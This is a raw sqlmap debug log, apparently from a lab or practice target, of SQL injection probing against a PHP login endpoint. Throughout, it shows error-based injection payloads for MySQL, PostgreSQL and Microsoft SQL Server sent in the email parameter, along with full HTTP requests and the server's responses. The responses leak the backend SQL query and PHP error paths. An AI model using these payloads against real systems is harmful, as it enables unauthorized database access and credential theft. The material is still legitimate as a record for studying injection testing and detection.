[03:17:18] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because the level (4) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (5) is higher than the provided (1)
[03:17:18] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[03:17:18] [PAYLOAD] test@chatai.com) AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND (5691=5691
[03:17:18] [TRAFFIC OUT] HTTP request [#18]:
GET /ai/includes/user_login.php?email= test@chatai.com) AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND (5691=5691&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#18] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 217
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%29%20AND%20EXTRACTVALUE%281735%2CCONCAT%280x5c%2C0x7176766b71%2C%28SELECT%20%28ELT%281735%3D1735%2C1%29%29%29%2C0x7176766b71%29%29%20AND%20%285691%3D5691&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND (5691=5691'"
    ]
}
[03:17:18] [PAYLOAD] test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))
[03:17:18] [TRAFFIC OUT] HTTP request [#19]:
GET /ai/includes/user_login.php?email= test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))&password=123 

HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#19] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 201
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))'"
    ]
}
[03:17:18] [PAYLOAD] test@chatai.com') AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND ('VzOo'='VzOo
[03:17:18] [TRAFFIC OUT] HTTP request [#20]:
GET /ai/includes/user_login.php?email=test@chatai.com') AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND ('VzOo'='VzOo&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#20] (200 OK):
Date: Sun, 19 Oct 2025 07:17:18 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=b92te8crouv8020qsauaraum2k; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com') AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND ('VzOo'='VzOo&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:18] [PAYLOAD] test@chatai.com' AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND 'hIaC'='hIaC
[03:17:18] [TRAFFIC OUT] HTTP request [#21]:
GET /ai/includes/user_login.php?email=test@chatai.com' AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71)) AND 'hIaC'='hIaC&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#21] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=2s6nbhd6vrnjkpr4oq4qpjumkv; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%27%20AND%20EXTRACTVALUE%281735%2CCONCAT%280x5c%2C0x7176766b71%2C%28SELECT%20%28ELT%281735%3D1735%2C1%29%29%29%2C0x7176766b71%29%29%20AND%20%27hIaC%27%3D%27hIaC&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:18] [PAYLOAD] test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))-- pucq
[03:17:18] [TRAFFIC OUT] HTTP request [#22]:
GET /ai/includes/user_login.php?email=test%40chatai.com%20AND%20EXTRACTVALUE%281735%2CCONCAT%280x5c%2C0x7176766b71%2C%28SELECT%20%28ELT%281735%3D1735%2C1%29%29%29%2C0x7176766b71%29%29--%20pucq&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#22] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 208
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test%40chatai.com%20AND%20EXTRACTVALUE%281735%2CCONCAT%280x5c%2C0x7176766b71%2C%28SELECT%20%28ELT%281735%3D1735%2C1%29%29%29%2C0x7176766b71%29%29--%20pucq&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND EXTRACTVALUE(1735,CONCAT(0x5c,0x7176766b71,(SELECT (ELT(1735=1735,1))),0x7176766b71))-- pucq'"
    ]
}
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
[03:17:18] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
[03:17:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[03:17:18] [PAYLOAD] test@chatai.com) AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (9791=9791
[03:17:18] [TRAFFIC OUT] HTTP request [#23]:
GET /ai/includes/user_login.php?email=test%40chatai.com%29%20AND%207189%3DCAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287189%3D7189%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%289791%3D9791&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:18] [TRAFFIC IN] HTTP response [#23] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 314
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test'test@chatai.com) AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (9791=9791&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND (9791=9791'"                                                                                                                                                             
    ]
}
[03:17:18] [PAYLOAD] test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)
[03:17:18] [TRAFFIC OUT] HTTP request [#24]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#24] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 298
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)'"                                                                                                                                                                             
    ]
}
[03:17:19] [PAYLOAD] test@chatai.com') AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('CGmb'='CGmb
[03:17:19] [TRAFFIC OUT] HTTP request [#25]:
GET /ai/includes/user_login.php?email=test@chatai.com') AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('CGmb'='CGmb&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#25] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=h3hs4o0t5rf7umhp3f25nsfb56; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com') AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND ('CGmb'='CGmb&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:19] [PAYLOAD] test@chatai.com' AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND 'hEXg'='hEXg
[03:17:19] [TRAFFIC OUT] HTTP request [#26]:
GET /ai/includes/user_login.php?email=test@chatai.com' AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND 'hEXg'='hEXg&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#26] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=4dhh40r3i0vi14iqom8pevkmnh; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com' AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC) AND 'hEXg'='hEXg&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

[03:17:19] [PAYLOAD] test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- Dqdr
[03:17:19] [TRAFFIC OUT] HTTP request [#27]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- Dqdr&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#27] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 305
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- Dqdr&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 7189=CAST((CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7189=7189) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- Dqdr'"                                                                                                                                                                      
    ]
}
[03:17:19] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
[03:17:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[03:17:19] [PAYLOAD] test@chatai.com) AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND (8131=8131
[03:17:19] [TRAFFIC OUT] HTTP request [#28]:
GET /ai/includes/user_login.php?email=test@chatai.com) AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND (8131=8131&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#28] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 315
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com) AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND (8131=8131&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com) AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND (8131=8131'"                                                                                                                                                            
    ]
}
[03:17:19] [PAYLOAD] test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))
[03:17:19] [TRAFFIC OUT] HTTP request [#29]:
GET /ai/includes/user_login.php?email=test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#29] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
Content-Length: 299
Connection: close
Content-Type: application/json
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))&password=123

{
    "status": "error",
    "messages": [
        "SELECT * FROM user WHERE email = 'test@chatai.com AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)))'"                                                                                                                                                                            
    ]
}
[03:17:19] [PAYLOAD] test@chatai.com') AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('qHQx'='qHQx
[03:17:19] [TRAFFIC OUT] HTTP request [#30]:
GET /ai/includes/user_login.php?email=test@chatai.com') AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('qHQx'='qHQx&password=123 HTTP/1.1
Cache-Control: no-cache
User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
Host: 10.10.48.19
Accept: */*
Accept-Encoding: gzip,deflate
Connection: close

[03:17:19] [TRAFFIC IN] HTTP response [#30] (200 OK):
Date: Sun, 19 Oct 2025 07:17:19 GMT
Server: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
X-Powered-By: PHP/7.4.29
Set-Cookie: PHPSESSID=7rmdlb488s2losjjoqhrq61vs2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 359
Connection: close
Content-Type: text/html; charset=UTF-8
URI: http://10.10.48.19/ai/includes/user_login.php?email=test@chatai.com') AND 9851 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (9851=9851) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(107)+CHAR(113))) AND ('qHQx'='qHQx&password=123

<br />
<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in C:\xampp\htdocs\ai\includes\functions.php:81
Stack trace:
#0 C:\xampp\htdocs\ai\includes\user_login.php(19): select_single(Object(mysqli), 'user', 'test@chatai.com...')
#1 {main}
  thrown in <b>C:\xampp\htdocs\ai\includes\functions.php</b> on line <b>81</b><br />

